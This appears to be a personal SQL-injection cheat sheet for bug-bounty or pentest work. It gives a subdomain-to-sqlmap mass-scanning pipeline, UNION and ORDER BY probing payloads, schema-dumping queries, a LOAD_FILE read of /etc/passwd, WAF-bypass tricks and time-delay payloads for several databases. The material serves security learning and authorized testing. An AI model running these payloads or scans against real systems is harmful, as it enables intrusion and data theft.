# SQLi

Status: Erledigt
Tags: SQL Injection (../Tags/SQL%20Injection%2027f2c37daa2980d5948ce5a24dacd7e6.md), Remote Code Execution (RCE) (../Tags/Remote%20Code%20Execution%20(RCE)%2027f2c37daa29804392b8ec44c972391b.md), Account Takeover (ATO) (../Tags/Account%20Takeover%20(ATO)%2027f2c37daa2980f4abc6c479151370af.md), NTLM (../Tags/NTLM%2027f2c37daa29809b8874cd8859c1b073.md)
Tags 2: SQL

[https://github.com/r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri)

[https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

[https://github.com/m4ll0k/Atlas](https://github.com/m4ll0k/Atlas)

[GitHub - malvads/sqlmc: Official Kali Linux tool to check all urls of a domain for SQL injections :)](https://github.com/malvads/sqlmc?tab=readme-ov-file)

[SQLMap Tamper Scripts (SQL Injection and WAF bypass)](https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423)

[SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)

[Advanced SQL Injections - cheatsheet.pdf](SQLi/Advanced_SQL_Injections_-_cheatsheet.pdf)

- Methods To Find SQL
    
    ## Using Burpsuite
    
    ```
    1. Capture the request using burpsuite
    2. Send the request to burp scanner
    3. Proceed with active scan
    4. Once the scan is finished, look for SQL vulnerability that has been detected
    5. Manually try SQL injection payloads
    6. Use SQLMAP to speed up the process
    ```
    
    ## Using waybackurls and other bunch of tools
    
    ```bash
    1. sublist3r -d target | tee -a domains 
    
    * You can use other tools like findomain, assetfinder, etc.
    ```
    
    ```bash
    2. cat domains | httpx | tee -a alive
    3. cat alive | waybackurls | tee -a urls
    4. gf sqli urls >> sqli
    5. sqlmap -m sqli --dbs --batch
    6. Use tamper scripts
    ```
    
    ## 3. Using heuristic scan to get hidden parameters :
    
    ```
    1. Use subdomain enumeration tools on the domain
    2. Gather all urls using hakcrawler, waybackurls, gau for the domain and subdomains
    3. You can use the same method described above in 2nd point
    4. Use Arjun to scan for the hidden params in the urls
    5. Use --urls flag to include all urls
    6. Check the params as <https://domain.com>?<hiddenparam>=<value>
    7. Send request to file and process it through sqlmap
    ```
    
    ## 4. Error generation with untrusted input or special characters :
    
    ```
    1. Submit single quote character ' and look for errors
    2. Submit SQL specific query
    3. Submit Boolean conditions such as or 1=1 and or 1=0 chekc application's response
    4. Submit certain payloads that results in time delay
    ```
    
    # Post-Methods
    
    ## Finding total number of columns
    
    ```
    Submit a series of ORDER BY clause such as
    
      ' ORDER BY 1 --
      ' ORDER BY 2 --
      ' ORDER BY 3 --
    
      and incrementing specified column index until an error occurs.
    ```
    
    ## Finding vulnerable columns with union operator
    
    ```
    Submit a series of UNION SELECT payloads.
    
      ' UNION SELECT NULL --
      ' UNION SELECT NULL, NULL --
      ' UNION SELECT NULL, NULL, NULL --
    
    Using NULL maximizes the probability that the payload will succeed
    NULL can be converted to every commonly used data type
    ```
    
    ## Extracting basic information
    
    ### 1. Database version
    
    ```
    Oracle 			  SELECT banner FROM v$version
    	       		  SELECT version FROM v$instance
    Microsoft 		SELECT @@version
    PostgreSQL 		SELECT version()
    MySQL 			  SELECT @@version
    
    ```
    
    ### 2. Database contents
    
    ```
    Oracle     
    SELECT * FROM all_tables
    SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
    
    MSSQL 		
    SELECT * FROM information_schema.tables
    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
    
    PostgreSQL 	  
    SELECT * FROM information_schema.tables
    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
    
    MySQL         
    SELECT * FROM information_schema.tables
    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE
    ```
    
    ### 3. Shows version, user and database name
    
    ```
    ' AND 1=2 UNION ALL SELECT concat_ws(0x3a,version(),user(),database())
    ```
    
    ### 4. Concat all the rows of the returned results
    
    ```
    ' union all select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=database()
    ```
    
    ## 4. Accessing system files and advance exploitation afterward
    
    ```
    ' UNION ALL SELECT LOAD_FILE ('/ etc / passwd')
    ```
    
    ## 5. Bypassing WAF :
    
    ### 1. Using Null byte before SQL query.
    
    ```
    %00' UNION SELECT password FROM Users WHERE username-'xyz'--
    ```
    
    ### 2. Using SQL inline comment sequence.
    
    ```
    '/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'xyz'--
    
    ```
    
    ### 3. URL encoding
    
    ```
    for example :
    / URL encoded to %2f
    * URL encoded to %2a
    
    Can also use double encoding, if single encoding doesn't works. Use hex encoding if the rest doesn't work.
    
    ```
    
    ### 4. Changing Cases (uppercase/lowercase)
    
    - For more step wise detailed methods, go through the link below
        - [https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)
    
    ### 5. Use SQLMAP tamper scripts - It helps bypass WAF/IDS/IPS.
    
    - Use Atlas. It helps suggesting tamper scripts for SQLMAP
        - [https://github.com/m4ll0k/Atlas](https://github.com/m4ll0k/Atlas)
    - JHaddix post on SQLMAP tamper scripts
        - [https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423](https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423)
    
    ## 6. Time Delays
    
    ```
    Oracle 	      dbms_pipe.receive_message(('a'),10)
    Microsoft 	  WAITFOR DELAY '0:0:10'
    PostgreSQL 	  SELECT pg_sleep(10)
    MySQL 	      SELECT sleep(10)
    ```
    
    ## 7. Conditional Delays
    
    ```
    Oracle 	      
    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
    
    Microsoft 	  
    IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
    
    PostgreSQL 	  
    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
    
    MySQL 	      
    SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
    ```
    
    ---
    
    [SQL Injection.md](https://kathan19.gitbook.io/howtohunt/sqli/sql_injection)
    

[Advanced SQLMap](SQLi/Advanced%20SQLMap%202d2bcd2491a74fbdbfa6b8ca3c57ce6d.md)

---

### Blind Injection - MSSQL Example

[**Intro to MSSQL/SQL Server**](SQLi/Intro%20to%20MSSQL%20SQL%20Server%202722c37daa298005a3e7e2e56a6677c3.md)

[**Blind SQL Injection**](SQLi/Blind%20SQL%20Injection%202722c37daa2980a39cbedcb2f14fbd2b.md)

[**Time-based SQLi**](SQLi/Time-based%20SQLi%202722c37daa2980e2afcbcf4491301e9e.md)

[Out-of-Band DNS](SQLi/Out-of-Band%20DNS%202732c37daa29805d8b17e78042ca7f47.md)

### Specific to MSSQL

[Remote Code Execution](SQLi/Remote%20Code%20Execution%2027d2c37daa2980609552cfc22bdb5044.md)

[**Leaking NetNTLM Hashes**](SQLi/Leaking%20NetNTLM%20Hashes%2027d2c37daa2980bb9406e416439617ca.md)

[File Read](SQLi/File%20Read%2027d2c37daa2980a9b7eff44f1989315f.md)

[Mitigation](SQLi/Mitigation%2027d2c37daa29805b9d88fb03f6ab7a09.md)

---

## PostgreSQL

[Introduction PostgreSQL](SQLi/Introduction%20PostgreSQL%202842c37daa29807fb493d594bf1237e1.md)

[Identifying Vulnerabilities](SQLi/Identifying%20Vulnerabilities%202842c37daa2980b6b9bdcc259d26ddde.md)

[Advanced SQLi Techniques](SQLi/Advanced%20SQLi%20Techniques%202852c37daa298056bc34c82f2e396a62.md)

## Specific to PostgreSQL

[PostgreSQL-Specific Techniques](SQLi/PostgreSQL-Specific%20Techniques%202862c37daa2980f1903acf703565c8f3.md)

## SQLMap

[Custom Tampering](SQLi/Custom%20Tampering%202872c37daa2980cebffdd38a08b0a754.md)